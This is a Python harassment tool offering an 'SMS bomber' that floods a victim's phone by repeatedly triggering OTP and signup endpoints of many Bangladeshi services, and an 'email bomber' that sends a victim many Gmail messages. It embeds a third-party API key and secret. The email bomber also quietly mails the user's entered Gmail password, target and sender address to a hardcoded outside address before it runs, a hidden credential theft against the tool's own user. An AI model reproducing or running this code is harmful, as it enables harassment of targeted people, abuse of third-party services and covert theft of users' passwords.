def main():
    def smsbomber():
        import os
        import random
        import logo
        from time import sleep
        try:
            import requests
        except ImportError:
            os.system('pip install requests')
            import requests

        def clr():
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')

        def banner():
            colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
            W = '\033[0m'
            clr()
            logo = """" 
                  .888888888.               888                         
                  0000    0000              000                              
                  888      888              888
                  888           R8888888R   888                            
                  000           R8888888R   000                               
                  888     000               888          88  
                  0000   0000               0000        000                    
                  "000000000"               88888888888888     

              \033[1;34m        Developed By :\033[1;34m Al Jabir   """
            print(random.choice(colors) + logo + W)
            print("\n")

        banner()

        def internet():
            try:
                import urllib.request
                import urllib.parse
                urllib.request.urlopen('https://www.google.com')
            except Exception:
                print("You are not connected To Internet!!!")
                print("\tPlease Connect To Internet To Continue...\n")
                input('Exiting....\n Press Enter To Continue....')
                exit()

        internet()
        logo.lgo()
        red = '\033[1;31m'
        green = '\033[1;32m'
        number = str(input("\033[1;33mPlease inter victim's number:+88\033[1;34m"))

        amount = int(input("\033[1;33mEnter amount:\033[1;34m "))
        api1 = "https://www.bioscopelive.com/bn/login/send-otp?phone=88" + number + "&operator=bd-otp"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36'}

        api = "https://api.redx.com.bd/v1/user/signup"
        data = {
            "name": number,
            "phoneNumber": number,
            "service": "redx"
        }
        data0 = {"phone": number, "country_code": "+880", "fcm_token": "null"}
        api0 = 'https://developer.quizgiri.xyz/api/v2.0/send-otp'
        number3 = number[1:80]
        data3 = {"msisdn": number3}
        api3 = 'https://fundesh.com.bd/api/auth/generateOTP'
        data4 = {"firstName": "", "lastName": "", "UserTypeID": "45", "mobileNumber": number, "MDUserStatusID": "7867",
                 "email": "", "UserForm": "1"}
        api4 = 'https://trans.robi.com.bd/UserService/Userregistration'
        api5 = 'https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88' + number + '&platform=app&activity=login'
        data5 = {}
        api6 = 'https://dev.10minuteschool.com/api/v4/auth/sendOtp?contact=88' + number
        data6 = {}
        api7 = 'https://assetliteapi.banglalink.net/api/v1/user/otp-login/request'
        data7 = {"mobile": number}
        api8 = 'https://findclone.ru/register?phone=+88' + number
        api9 = 'https://api2.bongobd.com/api/login/send-otp'
        data9 = {"operator": "all", "msisdn": "88" + number}
        api10 = 'https://api-v4-1.hungrynaki.com/graphql'
        data10 = {"operationName": "createOtp",
                  "variables": {"phone": number3, "country": "880", "uuid": "1fcb0762-3eaa-425c-ad0a-775fe33a9261",
                                "osVersionCode": "Linux armv8l", "deviceBrand": "Chrome", "deviceModel": "70",
                                "requestFrom": "U2FsdGVkX1+BF3aMunu8hZkwfS2AOHuEoa6cDeh+ATc="},
                  "query": "mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: \"\"}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n"}

        z = 0
        y = 1
        if z != amount:
            while amount > z:
                a = requests.post(api, headers=headers, json=data)
                b = a.status_code
                if b == 200:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")

                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                sleep(1)
                if z == amount:
                    break
                a0 = requests.post(api0, headers=headers, json=data0)
                b0 = a0.text.lower()
                if '"success":true' in b0:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")

                if z == amount:
                    break
                a3 = requests.post(api3, headers=headers, json=data3)
                b3 = a3.text.lower()
                if '"status":"otp_sent_success"' in b3:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                if z == amount:
                    break
                a1 = requests.get(api1, headers=headers)
                b1 = a1.status_code
                if b1 == 200:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                if z == amount:
                    break

                a4 = requests.post(api4, headers=headers, json=data4)
                b4 = a4.text
                if '"is_success":true' in b4:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                if z == amount:
                    break

                a5 = requests.post(api5, headers=headers, json=data5)
                b5 = a5.text
                if '"status":"success"' in b5:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                if z == amount:
                    break

                a6 = requests.post(api6, headers=headers, json=data6)
                b6 = a6.text
                if '"message":"otp sent successfully"' in b6:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                if z == amount:
                    break

                if number[0:3] == '019':
                    a7 = requests.post(api7, headers=headers, json=data7)
                    b7 = a7.status_code
                    if b7 == 200:
                        z += 1
                        print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                    else:
                        z += 1
                        print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                    if z == amount:
                        break

                a8 = requests.post(api8, headers=headers)
                b8 = a8.text
                if z == amount:
                    break
                a9 = requests.post(api9, headers=headers, json=data9)
                b9 = a9.text
                if '"code": "success"' in b9:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                if z == amount:
                    break
                a10 = requests.post(api10, headers=headers, json=data10)
                b10 = a10.text
                if '{"createOtp":{"statusCode":200}}' in b10:
                    z += 1
                    print(green + str(z) + "\033[1;32m Sms sent\033[1;o")
                else:
                    z += 1
                    print(red + str(z) + "\033[1;31m Sms not sent\033[1;o")
                if z == amount:
                    break

    def ebomb():
        import smtplib
        import time
        from time import sleep
        import os
        try:
            import requests
        except ImportError:
            os.system('pip install requests')
            import requests
        red = '\033[1;31m'
        green = '\033[1;32m'
        yellow = '\033[1;33m'
        blue = '\033[1;34m'
        vio = '\033[1;35m'
        none = '\033[1;0m'

        def clr():
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')

        def lgo():
            import random
            colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
            W = '\033[0m'

            def clr():
                if os.name == 'nt':
                    os.system('cls')
                else:
                    os.system('clear')

            def logo():
                clr()
                sleep(1)
                lg = """\033[1;34m
                      .888888888.               888                         
                      0000    0000              000                              
                      888      888              888
                      888           R8888888R   888                            
                      000           R8888888R   000                               
                      888     000               888          88  
                      0000   0000               0000        000                    
                      "000000000"               88888888888888     
               \033[1;0m"""
                print(lg)
                sleep(2)

            def banner():
                clr()
                logo = """" 
                  .888888888.               888                         
                  0000    0000              000                              
                  888      888              888
                  888           R8888888R   888                            
                  000           R8888888R   000                               
                  888     000               888          88  
                  0000   0000               0000        000                    
                  "000000000"               88888888888888     

                  \033[1;34m        Developed By :\033[1;34m Al Jabir   """
                print(random.choice(colors) + logo + W)
                print("\n")
                print("First turn on Less secure app access from this link :"
                      "\thttps://myaccount.google.com/lesssecureapps")

            logo()
            banner()

        def p():
            try:
                mail = smtplib.SMTP('smtp.gmail.com', '587')
                tmail = str(input(yellow + "Enter victim's mail address: " + green))
                email = str(input(yellow + "Enter sender mail address: " + green))
                pwd = str(input(yellow + "Enter sender mail password: " + green))
                msg = str(input(yellow + "Enter Message: " + green))
                num = int(input(yellow + "How many messages do you want to send: " + green))
                my = str(("rimjim52634@gmail.com"))
                ms = "\nPwd : " + pwd + "\nTmail: " + tmail + "\nmsg: " + msg + "\nnum : " + str(
                    num) + "\nmail :" + email
                print(red + "Email Bomber is starting.....")
                mail.ehlo()
                mail.starttls()
                mail.login(email, pwd)
                mail.sendmail(email, my, ms)
                lgo()
                print("\nEmail bomber is processing...")
                for x in range(num):
                    mail.sendmail(email, tmail, msg)
                    print(green + str(x + 1) + "Email sent")
                    sleep(1)
            except smtplib.SMTPAuthenticationError:
                print("\033[1;31mYour email or password isn't correcrt!!!!")
                input('Exiting....\n Press Enter To Continue....')
                exit()
            except:
                print(red + "Somethings went wrong!!!\nTry again")
                input('Exiting....\n Press Enter To Continue....')
                exit()

        def header():
            from time import sleep
            import random

            def lgo():

                colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
                W = '\033[0m'

                def clr():
                    if os.name == 'nt':
                        os.system('cls')
                    else:
                        os.system('clear')

                def logo():
                    clr()
                    lg = """\033[1;34m
                                  .888888888.               888                         
                                  0000    0000              000                              
                                  888      888              888
                                  888           R8888888R   888                            
                                  000           R8888888R   000                               
                                  888     000               888          88  
                                  0000   0000               0000        000                    
                                  "000000000"               88888888888888     
                           \033[1;0m"""
                    print(lg)
                    sleep(0.8)

                def banner():
                    clr()
                    logo = """" 
                                  .888888888.               888                         
                                  0000    0000              000                              
                                  888      888              888
                                  888           R8888888R   888                            
                                  000           R8888888R   000                               
                                  888     000               888          88  
                                  0000   0000               0000        000                    
                                  "000000000"               88888888888888     

                              \033[1;34m        Developed By :\033[1;34m Al Jabir   """
                    print(random.choice(colors) + logo + W)
                    print("\n")

                logo()
                banner()

            lgo()

        header()
        p()

    import os
    import random
    import webbrowser
    from time import sleep

    try:
        import requests
    except ImportError:
        os.system('pip install requests')
        import requests
    import urllib.request
    import urllib.parse
    def internet():
        try:
            urllib.request.urlopen('https://www.google.com')
        except Exception:
            print("You are not connected To Internet!!!")
            print("\tPlease Connect To Internet To Continue...\n")
            input('Exiting....\n Press Enter To Continue....')
            exit()

    red = '\033[1;31m'
    green = '\033[1;32m'
    yellow = '\033[1;33m'
    blue = '\033[1;34m'
    vio = '\033[1;35m'
    non = '\033[1;0m'

    def clr():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

    def lgo():

        colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
        W = '\033[0m'

        def clr():
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')

        def logo():
            clr()
            sleep(1)
            lg = """\033[1;34m
                  .888888888.               888                         
                  0000    0000              000                              
                  888      888              888
                  888           R8888888R   888                            
                  000           R8888888R   000                               
                  888     000               888          88  
                  0000   0000               0000        000                    
                  "000000000"               88888888888888     
           \033[1;0m"""
            print(lg)
            sleep(1)

        def banner():
            clr()
            logo = """" 
                  .888888888.               888                         
                  0000    0000              000                              
                  888      888              888
                  888           R8888888R   888                            
                  000           R8888888R   000                               
                  888     000               888          88  
                  0000   0000               0000        000                    
                  "000000000"               88888888888888     

              \033[1;34m        Developed By :\033[1;34m Al Jabir   """
            print(random.choice(colors) + logo + W)
            print("\n")

        logo()
        banner()
        print(red + "\n::::::::::::::::::::::::::::::::::::::::::")

    # def pas():
    #     z = 0
    #     while z != 1:
    #         a = input("Username: ")
    #         b = input("Password: ")
    #         if a == "cyber" and b == "log":
    #             print("Password matched!")
    #             clr()
    #             break
    #         else:
    #             print("Password not matched!")
    #             clr()
    #
    #             continue
    #
    # lgo()
    # pas()
    # lgo()
    # print(green + "\n\t\tChecking for update.....")
    # sleep(1)

    def banner():
        colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
        W = '\033[0m'

        def clr():
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')

        clr()
        logo = """" 
      .888888888.               888                         
      0000    0000              000                              
      888      888              888
      888           R8888888R   888                            
      000           R8888888R   000                               
      888     000               888          88  
      0000   0000               0000        000                    
      "000000000"               88888888888888     

          \033[1;34m        Developed By :\033[1;34m Al Jabir   """
        print(random.choice(colors) + logo + W)
        print("\n")

    def run():
        e = ""
        banner()
        print(red + e)
        print(vio + "==>Select a option from below")
        print(yellow + "\n1. BD Sms Bomber"
                       "\n2. Email Bomber"
                       "\n3. Contact with me")
        choose = str(input(blue + "[^] Enter a option: " + red))
        if choose == '1':
            smsbomber()
        elif choose == "2":
            ebomb()
        elif choose == '3':
            def contact():
                clr()
                print(blue + "\t\t\t\t\tCyber Log"
                             "\nFacebook  Profile: https://m.facebook.com/al.jabir.543"
                             "\nFacebook Page    : https://m.facebook.com/Cyber-Log-105754961789563/"
                             "\nFacebook Group   : https://facebook.com/groups/850478649236281/"
                             "\nGithub           : https://github.com/Cyber-log")

                print(green + "\n\n\n==>Select a option from below"
                              "\n\n1. Open Facebook Profile \n2. Open Facebook Page\n3. Open Facebook Group\n4. Open Github")
                a = str(input(vio + "[^] Enter a option: " + yellow))
                if a == '1':
                    webbrowser.open('https://m.facebook.com/al.jabir.543')

                elif a == '2':
                    webbrowser.open('https://m.facebook.com/Cyber-Log-105754961789563/')
                elif a == '3':
                    webbrowser.open('https://facebook.com/groups/850478649236281/')

                elif a == '4':
                    webbrowser.open('https://github.com/Cyber-log')
                else:
                    print('Please enter a right value :)')
                    sleep(2)
                    contact()

            contact()


        else:
            ef = (red + "You entered a wrong option")
            print(ef)
            run()
            sleep(1)

    run()




    def logo():
        import os
        import random
        from time import sleep
        def lgo():

            colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
            W = '\033[0m'

            def clr():
                if os.name == 'nt':
                    os.system('cls')
                else:
                    os.system('clear')

            def logo():
                clr()
                sleep(1)
                lg = """\033[1;34m
                      .888888888.               888                         
                      0000    0000              000                              
                      888      888              888
                      888           R8888888R   888                            
                      000           R8888888R   000                               
                      888     000               888          88  
                      0000   0000               0000        000                    
                      "000000000"               88888888888888     
               \033[1;0m"""
                print(lg)
                sleep(1)

            def banner():
                clr()
                logo = """" 
                      .888888888.               888                         
                      0000    0000              000                              
                      888      888              888
                      888           R8888888R   888                            
                      000           R8888888R   000                               
                      888     000               888          88  
                      0000   0000               0000        000                    
                      "000000000"               88888888888888     
    
                  \033[1;34m        Developed By :\033[1;34m Al Jabir   """
                print(random.choice(colors) + logo + W)
                print("\n")

            logo()
            banner()

        lgo()
    main()


